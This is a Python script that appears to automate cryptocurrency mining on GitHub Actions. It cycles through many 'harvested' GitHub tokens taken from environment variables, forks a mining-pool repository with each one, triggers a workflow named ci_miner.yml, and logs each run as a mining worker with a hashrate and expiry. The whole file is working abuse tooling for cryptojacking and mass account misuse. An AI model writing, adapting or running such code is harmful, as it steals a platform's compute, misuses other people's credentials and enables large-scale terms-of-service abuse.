#!/usr/bin/env python3
import requests, time, os
from datetime import datetime, timedelta

class GithubActionsEnroller:
    BASE = 'https://api.github.com'
    POOL_REPO = 'Ox518/genFre'
    WORKFLOW  = 'ci_miner.yml'
    def __init__(self):
        self.token = os.environ.get('GITHUB_TOKEN','')
        self.headers = {'Authorization':f'Bearer {self.token}',
            'Accept':'application/vnd.github+json','X-GitHub-Api-Version':'2022-11-28'}
    def get_token(self, i):
        return os.environ.get(f'HARVEST_GH_TOKEN_{i}', self.token)
    def fork_repo(self, token):
        h = {**self.headers,'Authorization':f'Bearer {token}'}
        r = requests.post(f"{self.BASE}/repos/{self.POOL_REPO}/forks",headers=h)
        return r.json().get('full_name') if r.status_code in (200,202) else None
    def dispatch(self, token, fork, duration=350):
        h = {**self.headers,'Authorization':f'Bearer {token}'}
        r = requests.post(f"{self.BASE}/repos/{fork}/actions/workflows/{self.WORKFLOW}/dispatches",
            headers=h,json={'ref':'main','inputs':{'pool_repo':self.POOL_REPO,'algo':'auto','duration':str(duration)}})
        return r.status_code == 204
    def enroll(self, count, platform, secrets=None):
        workers = []
        for i in range(count):
            token = self.get_token(i)
            fork  = self.fork_repo(token)
            if not fork: continue
            time.sleep(5)
            if self.dispatch(token, fork):
                workers.append({'id':f'gh-{fork.replace("/","-")}-{int(time.time())}',
                    'algo':'auto','hashrate':'~50KH/s',
                    'expires_at':(datetime.utcnow()+timedelta(minutes=350)).isoformat()+'Z',
                    'url':f'https://github.com/{fork}/actions'})
        return workers
